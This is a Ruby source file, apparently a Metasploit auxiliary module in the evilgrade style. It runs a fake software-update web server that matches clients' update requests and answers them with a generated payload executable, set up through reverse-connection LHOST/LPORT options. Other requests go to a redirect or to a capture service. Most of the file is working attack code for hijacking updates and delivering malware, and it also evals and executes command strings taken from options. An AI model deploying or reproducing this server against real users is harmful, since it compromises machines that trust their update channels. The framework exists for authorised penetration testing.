module Msf

	###
	#
	# This module provides methods for fake Update Server attacks
	#
	###

	module Auxiliary::Update

		attr_reader :base, :agent
		require 'resolv'
		require 'digest/md5'
		include Msf::Auxiliary::Report
		require 'msf/core/exploit'
		include Msf::Exploit::Remote::TcpServer
		#include Msf::Exploit::Remote::HttpServer::HTML

		def initialize(info = {})
			super(
				'Actions'     => [ [ 'Update' ] ],
				'PassiveActions' => [ 'Update' ],
				'DefaultAction'  => 'Update' 
			)
			register_options(
				[
					OptPort.new('SRVPORT',		[ false, "The local port to listen on.", 80 ]),
					OptString.new('UPAYLOAD',    [ true, "The fake update.", nil ]),
					OptAddress.new('LHOST',    [ false, "Reverse connection host.", nil ]),
					OptPort.new('LPORT',    [ false, "Reverse connection port.", nil ]),
					OptAddress.new('CAPTURE_HOST',[ false, "The IP address of the http capture service ", nil ]),
					OptPort.new('CAPTURE_PORT', 	[ false, "Not matched requests will be forwarded to, if defined the http capture module running at this port, else a redirect to the real ip adress)", nil ])
			], Auxiliary::Update)
			create_agent()
		end

		def on_client_connect(c)
			c.extend(Rex::Proto::Http::ServerClient)
			c.init_cli(self)
		end

		def on_client_data(cli)
			begin
				data = cli.get_once(-1, 5)
				raise ::Errno::ECONNABORTED if not (data or data.length == 0)
				case cli.request.parse(data)

				when Rex::Proto::Http::Packet::ParseCode::Completed
					dispatch_request(cli, cli.request)
					cli.reset_cli
				when  Rex::Proto::Http::Packet::ParseCode::Error
					close_client(cli)
				end
			rescue ::EOFError, ::Errno::EACCES, ::Errno::ECONNABORTED, ::Errno::ECONNRESET
			rescue ::OpenSSL::SSL::SSLError
			rescue ::Exception
				print_status("Error: #{$!.class} #{$!} #{$!.backtrace}")
			end

			close_client(cli)
		end

		def close_client(cli)
			cli.close
		end

		def run
			super if not framework.datastore['update_server'] 
		end

		def dispatch_request(cli,req)
			res = nil
			print_status("Request #{req['Host']}")
			@base['vh'].each{ |vh|
				if req['Host'] =~ /#{vh}/
					@base['request'].each{ |request|
						if req.uri.to_s =~ /#{request['req']}/
							data = case request['type']
							       when "file"; 	on_client_request_file(cli, req, request)
							       when "string"; 	on_client_request_string(cli, req, request)
							       when "agent";	on_client_request_agent(cli, req, request)
							       when "redirect"; res = redirect(cli, req, request['to'])
							       else 		
										'unkown'
							       end
							res ||= create_response(request['type'],data,req['Host'],request['header'] )
							break
						end
					}	
				end	
			} if not @base.nil?
			res ||= redirect(cli, req) 			
			cli.put(res)
			return	
		end

		def on_client_request_string(cli,req,conf)
			data = conf['string']
			@base['options'].each{ |name, config|
				val = eval(config['val']) if config['dynamic'].eql?(1)
				val ||= config['val']
				data.gsub!(/\<\%#{name.upcase}\%\>/, val.to_s)
			} if conf['parse'].eql?(1)	
			return data
		end

		def on_client_request_file(cli,req,conf)
			fname = File.join(Msf::Config.install_root, "data", "exploits", "update", "http", conf['file'] )
			data = File.read(fname)
			@base['options'].each{ |name, config|
				val = eval(config['val']) if config['dynamic'].eql?(1)
				val ||= config['val']
				data.gsub!(/\<\%#{name.upcase}\%\>/, val.to_s)
			} if conf['parse'].eql?(1)	
			return data 
		end

		def on_client_request_agent(cli,req,conf)
			print_status "serving fake update to client"
			return @agent
		end


		def redirect(cli, req, to=false)
			if datastore['CAPTURE_PORT'].nil?
				begin
					ip = Resolv.getaddress(req['Host']).to_s
					to ||= "http://#{ip}#{req.uri}"
				rescue
					print_status("could not resolve dns")
				end
				if req.uri =~ /\.html/ or not req.uri =~ /\./ 
					data = "<html><head></head><frameset rows='100%'>" +
								"<frame src='#{to}'></frameset>" +
								"</html>"
					res = create_response('string',data, req['Host'] )
				else
					res = "HTTP/1.1 307 Temporary Redirect\r\n" +
						"Location: #{to}\r\n" +
						"Content-Type: text/html\r\n" +
						"Content-Length: 0" +
						"Connection: Close\r\n\r\n"
				end
			else
				ip = datastore['CAPTURE_HOST']
				port = datastore['CAPTURE_PORT']
				res = "HTTP/1.1 301 Moved Permanently\r\n" +
					"Location: http://#{ip}:#{port}/\r\n" +
					"Content-Type: text/html\r\n" +
					"Content-Length: 0" +
					"Connection: Close\r\n\r\n"
			end
			return res
		end

		def create_response(type, data, host, header=false)
			res = "HTTP/1.1 200 OK\r\n" 
			res << "Host: #{host}\r\n"
			res << "Expires: 0\r\n" 
			res << "Cache-Control: must-revalidate\r\n"
			if type.eql?("agent")
				res <<	"Content-Type: application/octet-stream\r\n" +
					"Content-Length: #{data.length}\r\n" +
					"Connection: Close\r\n\r\n#{data}"

			elsif not header.nil?
				res << 	"Content-Type: #{header}\r\n" +
					"Content-Length: #{data.length}\r\n" +
					"Connection: Close\r\n\r\n#{data}"
			else
				res <<  "Content-Type: text/html\r\n" +
					"Content-Length: #{data.length}\r\n" +
					"Connection: Close\r\n\r\n#{data}"
			end
			return res 
		end

		def create_agent()
			agent = datastore['UPAYLOAD']
			# old evilgrade style, eval generation
			if (agent =~ /^\[([\w\W]+)\]$/) 
				cmd = eval($1) 
				cmd =~ /\<\%OUT\%\>([\w\W]+)\<\%OUT\%\>/ 

				out = $1
				cmd.gsub!( /\<\%OUT\%\>/ , '')

				mret = system(cmd)
				agent=out
			elsif (agent =~ /^\<([\w\W]+)\>$/)
				# use file on disk
				agent = File.read($1)
			else
				# metasploit generation
				# Create the payload instance
				payload = framework.payloads.create(agent)
				payload.datastore.import_options_from_hash(datastore)

				if (payload == nil)
					puts "Invalid payload: #{agent}"
					exit
				end

				begin
					buf = payload.generate_simple(
				'Format'    => 'raw',
				'Options' => datastore)
				rescue
					puts "Error generating payload: #{$!}"
					exit
				end


				arch = payload.arch
				plat = payload.platform.platforms

				encoders = []
				#framework.encoders.each_module_ranked(
				#	'Arch' => arch ? arch.split(',') : nil) { |name, mod|
				#	encoders << mod.new
				#}
				
				badchars = ''
				encoders.each { |enc|
					next if not enc
					begin
						# Imports options
						enc.datastore.import_options_from_hash(datastore)

						# Encode it up
						buf = enc.encode(buf, badchars)
					rescue
						print_status(OutError + "#{enc.refname} failed: #{$!}")
					end
				}

				if (arch.index(ARCH_X86))
					if (plat.index(Msf::Module::Platform::Windows))
						#buf = Rex::Text.to_win32pe(buf)
						#buf = Msf::Util::EXE.to_win32pe(buf)
						buf = ""
					elsif (plat.index(Msf::Module::Platform::Linux))
						buf = Rex::Text.to_linux_x86_elf(buf)
					elsif(plat.index(Msf::Module::Platform::OSX))
						buf = Rex::Text.to_osx_x86_macho(buf)
					end						
				end

				if(plat.index(Msf::Module::Platform::OSX))
					if(arch.index(ARCH_ARMLE))
						buf = Rex::Text.to_osx_arm_macho(buf)
					elsif(arch.index(ARCH_PPC))
						buf = Rex::Text.to_osx_ppc_macho(buf)
					end
				end
				#	$stderr.puts "No executable format support for this arch/platform"

				agent = buf
				#payload.datastore.import_options_from_s(ARGV.join('_|_'), '_|_')
			end
			if agent.nil?
				puts "could not create agent"
				exit
			end
			@agent = agent
		end

		def RndNum(n)
			data = ''
			n.to_i.times{ data += rand(9).to_s }
			return data
		end

		def RndAlpha(n)	
			chars = ("a".."z").to_a + ("A".."Z").to_a + ("0".."9").to_a
			data = ''

			n.to_i.times{ data += chars[rand(chars.size-1)].to_s	}
			return data
		end
		
		def MD5(data=@agent)
			return Digest::MD5.hexdigest(data)
		end

		def SIZE(data=@agent)
			return data.length
		end

	end
end
